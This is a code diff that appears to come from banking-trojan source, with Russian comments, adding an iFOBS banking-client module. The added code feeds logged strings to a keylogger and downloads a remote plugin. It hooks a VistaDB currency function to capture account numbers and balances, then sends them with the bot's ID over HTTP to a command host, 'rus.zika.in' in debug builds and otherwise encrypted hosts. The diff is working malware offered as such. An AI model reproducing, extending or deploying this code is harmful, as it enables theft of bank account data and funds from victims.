@@ -4,6 +4,9 @@
 #include "Utils.h"
 #include "Splice.h"
 #include "modules.h"
+#include "Plugins.h"
+#include "rafa.h"
+#include "BotHTTP.h"
 
 #include "BotDebug.h"
 
@@ -27,6 +30,16 @@ struct ForFindEditControl
 	int n;
 };
 
+struct AccBalans
+{
+	char acc[64];
+	char balans[64];
+};
+
+int ( WINAPI *pTVDBDirectGetCurrency )(int P1, int P2);
+//прототип из ifobs.plug
+typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
+
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
 	ForFindEditControl* ffec = (ForFindEditControl*)lParam;
@@ -49,6 +62,7 @@ void AddStrLog( const char* name, const char* value )
 	if( value )
 		m_lstrcat( buf, value );
 	m_lstrcat( buf, "\r\n" );
+	KeyLogger::AddStrToBuffer( 0, buf, 0 );
 	DBG( "IFobs", buf );
 }
 
@@ -86,10 +100,88 @@ void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 	}
 }
 
+static char* GetAdminUrl( char* url )
+{
+#ifdef DEBUGCONFIG
+	m_lstrcpy( url, "rus.zika.in" );
+#else
+//	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
+	string host = GetActiveHostFromBuf2( Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
+	if( !host.IsEmpty() )
+		m_lstrcpy( url, host.t_str() );
+	else
+		url = 0;
+#endif
+	return url;
+}
+
+static DWORD WINAPI SendBalans( LPVOID p )
+{
+	char urlAdmin[128];
+	if( GetAdminUrl(urlAdmin) )
+	{
+		AccBalans* ab = (AccBalans*)p;
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+		TMemory request(512);
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&mode=balance&sum=%s&acc=%s", urlAdmin, BOT_UID, ab->balans, ab->acc );
+//		THTTP H;
+//		H.Get(request.AsStr());
+		THTTPResponseRec Response;
+		ClearStruct(Response);
+		HTTP::Get( request.AsStr(), 0, &Response );
+		HTTPResponse::Clear(&Response);
+		DBG( "IFobs", "Отослали запрос: %s", request.AsStr() );
+	}
+	MemFree(p);
+	return 0;
+}
+
+void WINAPI PutBalans( const char* acc, const char* balans )
+{
+	DBG( "IFobs", "acc: %s, balans: %s", acc, balans );
+	AccBalans* ab = (AccBalans*)MemAlloc(sizeof(AccBalans));
+	m_lstrcpy( ab->acc, acc );
+	m_lstrcpy( ab->balans, balans );
+	RunThread( SendBalans, ab );
+}
+
+DWORD WINAPI PluginIFobs(LPVOID)
+{
+	TPlugin ifobsPlug("ifobs.plug");
+	if( ifobsPlug.Download(true) )
+	{
+		ifobsPlug.SetNotFree();
+		DBG( "IFobs", "Загрузили ifobs.plug" );
+		PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
+		if( InitFunc )
+		{
+			DBG( "IFobs", "есть InitFunc" );
+			DWORD HProc1 = (DWORD)ifobsPlug.GetProcAddress("HProc1");
+			if( HProc1 )
+			{
+				DBG( "IFobs", "есть HProc1" );
+				//хукаем функцию @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString
+				if( HookApi( "VistaDB_D7.bpl", 0x238E92A4, (PVOID)HProc1, (PVOID*)&pTVDBDirectGetCurrency ) )
+				{
+					DBG( "IFobs", "Установлен хук на @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString" );
+					if( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
+						DBG( "IFobs", "BalanceCallBack set ok.");
+					if( InitFunc((DWORD)pTVDBDirectGetCurrency, "GetCurrency") )
+						DBG( "IFobs", "хук установлен успешно, %08x %08x", pTVDBDirectGetCurrency, HProc1 );
+				}
+			}
+		}
+	}
+	else
+		DBG( "IFobs", "Не удалось загрузить ifobs.plug" );
+	return 0;
+}
+
 void Activeted(LPVOID Sender)
 {
 	DBG( "IFobs", "Activated" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
+	RunThread( PluginIFobs, 0 );
 }
 
 bool Init()
